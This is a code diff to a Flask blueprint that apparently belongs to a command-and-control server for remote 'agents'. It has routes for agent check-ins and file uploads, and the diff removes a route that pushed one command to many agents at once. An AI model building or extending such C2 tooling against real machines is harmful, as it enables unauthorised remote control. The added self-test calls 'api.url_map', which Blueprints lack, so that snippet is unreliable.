@@ -1,20 +1,79 @@
 import os
+import sys
+from pathlib import Path
+
+# Add the project root to the Python path
+project_root = Path(__file__).resolve().parents[2]
+if str(project_root) not in sys.path:
+    sys.path.insert(0, str(project_root))
+
 from datetime import datetime
 from flask import Blueprint, request, abort, url_for, render_template
 from werkzeug.utils import secure_filename
 from markupsafe import escape
 
-# Import from parent directory
-import sys
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+# Import with error handling for when running directly
+try:
+    from ..webui import require_admin
+    from ..models import Agent, Command, db
+except ImportError as e:
+    print(f"Import error: {e}")
+    print(f"Current working directory: {os.getcwd()}")
+    print(f"Python path: {sys.path}")
+    print(f"Project root: {project_root}")
+    print("\nThis file should be imported as part of a Flask application.")
+    print("To run the application, look for a main Flask app file (like app.py, main.py, or run.py)")
+    print("in the project root directory and run that instead.")
 
-from models import Agent, Command, db
-from webui import require_admin
+    # Don't exit immediately - provide more debugging info
+    if __name__ == '__main__':
+        print("\nDebugging info:\n")
+        print("Files in project root:\n")
+        try:
+            for item in os.listdir(project_root):
+                print(f"  {item}")
+        except Exception as ex:
+            print(f"  Error listing files: {ex}")
+
+        print("\nFiles in server directory:\n")
+        server_dir = project_root / 'server'
+        try:
+            for item in os.listdir(server_dir):
+                print(f"  {item}")
+        except Exception as ex:
+            print(f"  Error listing server files: {ex}")
+
+    # Create dummy functions for testing if running directly
+    if __name__ == '__main__':
+        print("\nCreating dummy functions for testing...\n")
+        def require_admin(f):
+            return f  # Dummy decorator
+
+        class DummyQuery:
+            def get(self, agent_id):
+                return None
+
+        class DummyAgent:
+            query = DummyQuery()
+
+        class DummyCommand:
+            query = DummyQuery()
+
+        class DummyDB:
+            session = None
+
+        Agent = DummyAgent
+        Command = DummyCommand
+        db = DummyDB()
+    else:
+        sys.exit(1)
 
 api = Blueprint('api', __name__)
 
 # Dummy geolocation function since pygeoip is unavailable
 def geolocation():
+    # You can integrate with a free API like ipinfo.io or ip-api.com if needed
+    # The '_ip' parameter was removed as it was unused.
     return 'Local'
 
 @api.route('/<agent_id>/push', methods=['POST'])
@@ -98,16 +157,12 @@ def upload_file(agent_id):
         db.session.commit()
     return ''
 
-@api.route('/mass_execute', methods=['POST'])
-@require_admin
-def mass_execute():
-    from flask import redirect, url_for
-    # Handle mass command execution for multiple agents
-    if 'agents' in request.form and 'cmd' in request.form:
-        agent_ids = request.form.getlist('agents')
-        command = request.form['cmd']
-        for agent_id in agent_ids:
-            agent = Agent.query.get(agent_id)
-            if agent:
-                agent.push_command(command)
-    return redirect(url_for('webui.agent_list'))
+# Add this for testing purposes only
+if __name__ == '__main__':
+    print("\n" + "="*50)
+    print("BLUEPRINT MODULE LOADED SUCCESSFULLY")
+    print("="*50)
+    print("This Flask Blueprint is now ready to be imported.")
+    print("Routes defined:\n")
+    for rule in api.url_map.iter_rules():
+        print(f"  {rule.rule} [{', '.join(rule.methods)}]")
